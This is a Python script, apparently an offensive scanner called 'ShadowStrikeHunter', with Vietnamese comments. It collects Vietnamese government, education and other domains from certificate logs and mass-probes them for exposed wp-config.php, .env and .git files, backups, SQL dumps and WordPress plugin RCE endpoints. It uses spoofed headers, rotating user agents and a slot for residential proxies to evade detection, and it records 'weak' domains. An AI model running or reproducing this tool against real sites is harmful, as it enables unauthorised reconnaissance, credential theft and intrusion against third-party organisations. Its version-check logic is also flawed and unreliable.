import requests
import re
import concurrent.futures
import urllib3
import random
import os
import sys
import time
from threading import Lock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

R, G, Y, B, C, P, W = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m', '\033[95m', '\033[0m'
BOLD, UNDER = '\033[1m', '\033[4m'

class ShadowStrikeHunter:
    def __init__(self):
        self.output = 'SHADOW_STRIKE_2026.txt'
        self.weak_domains_file = 'WEAK_DOMAINS.txt'
        self.targets = set()
        self.processed = 0
        self.found_count = 0
        self.lock = Lock()

        # PROXY & UA
        self.proxies = []  # ← DÁN RESIDENTIAL PROXY VÀO ĐÂY
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
        ]

        # ENDPOINTS NÂNG CẤP - 2026 hot nhất
        self.critical_endpoints = [
            ('/wp-config.php', 'DB_CONFIG'),
            ('/.env', 'ENV_FILE'),
            ('/wp-content/debug.log', 'WP_LOG'),
            ('/.git/config', 'GIT_CONF'),
            ('/wp-content/ai1wm-backups/', 'AI1WM_DIR'),
            ('/wp-content/updraft/', 'UPDRAFT_DIR'),
            ('/wp-content/uploads/duplicator-backups/', 'DUPLICATOR_BACKUP'),
            ('/wp-content/uploads/wpvivid-backup/', 'WPVIVID_BACKUP'),
            ('/wp-content/backups-dup-lite/', 'DUPLICATOR_LITE'),
            ('/wp-content/uploads/backupbuddy-backups/', 'BACKUPBUDDY'),
            ('/wp-admin/admin-ajax.php?action=duplicator_download', 'DUPLICATOR_RCE'),
            ('/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', 'FILE_MANAGER_RCE'),
            ('/wp-content/plugins/backup-backup/includes/backup-heart.php', 'BACKUP_RCE'),
            ('/wp-json/wp/v2/users', 'USER_ENUM'),
            ('/xmlrpc.php', 'XMLRPC_BRUTE'),
            ('/wp-content/uploads/wp-backup.sql', 'SQL_DUMP'),
            ('/phpinfo.php', 'PHP_INFO'),
            ('/wp-links-apk.php', 'POTENTIAL_SHELL'),
        ]

        # Plugin phổ biến dễ vuln ở VN
        self.vuln_plugins = {
            'elementor': {'old': ['<3.25.0'], 'desc': 'RCE/Priv Esc CVE'},
            'contact-form-7': {'old': ['<5.9.0'], 'desc': 'SQLi/XSS'},
            'woocommerce': {'old': ['<9.5.0'], 'desc': 'Multiple CVE'},
            'wp-file-manager': {'old': ['<7.2.0'], 'desc': 'Unauth RCE'},
            'wp-ulike': {'old': ['<4.6.9'], 'desc': 'Stored XSS/SQLi'},
        }

    def get_proxy(self):
        if not self.proxies: return None
        p = random.choice(self.proxies)
        return {"http": p, "https": p}

    def fetch_infinity_sources(self):
        kws = ['.gov.vn', '.edu.vn', 'wordpress', 'wp-content', 'portal', 'vn', 'thuvien', 'tintuc']
        print(f"{B}[*] Đang thu thập mục tiêu đa nguồn...{W}")

        def get_crt(kw):
            try:
                r = requests.get(f"https://crt.sh/?q={kw}&output=json", timeout=30)
                if r.status_code == 200:
                    return [i['name_value'].lower().replace('*.', '')
                            for i in r.json()
                            if len(i['name_value'].split('.')) <= 4 and len(i['name_value']) < 80]
                return []
            except Exception as e:
                print(f"{Y}[!] Lỗi {kw}: {str(e)}{W}")
                return []

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(get_crt, kw) for kw in kws]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:  # Tránh NoneType
                    self.targets.update(result)

        print(f"{G}[✅] Tổng kho mục tiêu: {len(self.targets):,} domain.{W}")

    def get_plugin_version(self, base_url, slug, headers, proxy):
        try:
            url = f"{base_url.rstrip('/')}/wp-content/plugins/{slug}/readme.txt"
            r = requests.get(url, headers=headers, proxies=proxy, timeout=6, verify=False)
            if r.status_code == 200:
                match = re.search(r'(?:Stable tag|Version):\s*([\d\.]+)', r.text, re.IGNORECASE)
                return match.group(1) if match else "Unknown"
        except:
            pass
        return "N/A"

    def audit(self, domain):
        findings = []
        proxy = self.get_proxy()
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }

        # Thử HTTPS trước, fallback HTTP
        base_url = None
        for proto in ['https', 'http']:
            url = f"{proto}://{domain}"
            try:
                time.sleep(random.uniform(0.3, 1.2))
                r_main = requests.get(url, headers=headers, proxies=proxy, timeout=12, verify=False)
                text_lower = r_main.text.lower()
                is_wp = any(x in text_lower for x in ['wp-content', 'wp-includes', 'wp-json', 'wordpress'])
                status_tag = f"{P}[WP]{W}" if is_wp else f"{C}[NON-WP]{W}"

                with self.lock:
                    sys.stdout.write(f"\r{Y}[*] Testing: {status_tag} {domain[:30]}{W} " + " " * 20)
                    sys.stdout.flush()

                if is_wp:
                    base_url = url
                    break
            except:
                continue

        if not base_url:
            with self.lock:
                self.processed += 1
            return

        # Quét endpoint
        for path, label in self.critical_endpoints:
            try:
                time.sleep(random.uniform(0.1, 0.5))
                full_url = base_url.rstrip('/') + path
                r = requests.get(full_url, headers=headers, proxies=proxy, timeout=7, verify=False, allow_redirects=False)

                if r.status_code == 200 and len(r.content) > 50:
                    if any(ind in r.text for ind in ['DB_PASSWORD', '<?php', 'Index of', 'WPRESS', 'Stable tag']):
                        findings.append(f"{R}[CRITICAL] {label}: {full_url}{W}")
            except:
                continue

        # Check plugin version
        plugin_slugs = set(re.findall(r'/wp-content/plugins/([^/\'"]+)/', r_main.text.lower()))
        if plugin_slugs:
            print(f"\n{Y}[PLUGIN] Detected on {domain}: {', '.join(list(plugin_slugs)[:6])}{W}")
            for slug in list(plugin_slugs)[:8]:
                ver = self.get_plugin_version(base_url, slug, headers, proxy)
                if ver != "N/A" and ver != "Unknown":
                    status = f"{P}[PLUGIN] {slug} v{ver}{W}"
                    if slug in self.vuln_plugins:
                        for old in self.vuln_plugins[slug]['old']:
                            if ver.startswith(tuple(old.split('.'))) or ver < old.lstrip('<'):
                                status = f"{R}[HIGH RISK] {slug} v{ver} - {self.vuln_plugins[slug]['desc']}{W}"
                                findings.append(status)
                    print(f"  → {status}")

        # Báo cáo
        with self.lock:
            self.processed += 1
            if findings:
                self.found_count += 1
                print(f"\n{G}{BOLD}[🎯] SUCCESS #{self.found_count}: {domain}{W}")
                for f in findings:
                    print(f" |-- {f}")
                with open(self.output, 'a') as f:
                    clean = [re.sub(r'\033\[[0-9;]*m', '', i) for i in findings]
                    f.write(f"TARGET: {domain}\n" + "\n".join(clean) + "\n\n")
                with open(self.weak_domains_file, 'a') as wf:
                    wf.write(f"{domain}\n")
                sys.stdout.write("\a")  # Beep khi hit

            perc = (self.processed / len(self.targets)) * 100 if self.targets else 0
            sys.stdout.write(f"\r{Y}[*] Progress: {self.processed}/{len(self.targets)} ({perc:.2f}%) | Ghosting: {domain[:25]}...{W}")
            sys.stdout.flush()

    def start(self, threads=50):
        self.fetch_infinity_sources()
        if not self.targets: return

        print(f"\n{B}{BOLD}[SHADOW STRIKE ACTIVATED] Threads: {threads} | Targets: {len(self.targets)}{W}\n")
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self.audit, list(self.targets))


if __name__ == "__main__":
    try:
        ShadowStrikeHunter().start(threads=50)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Dừng bởi người dùng.{W}")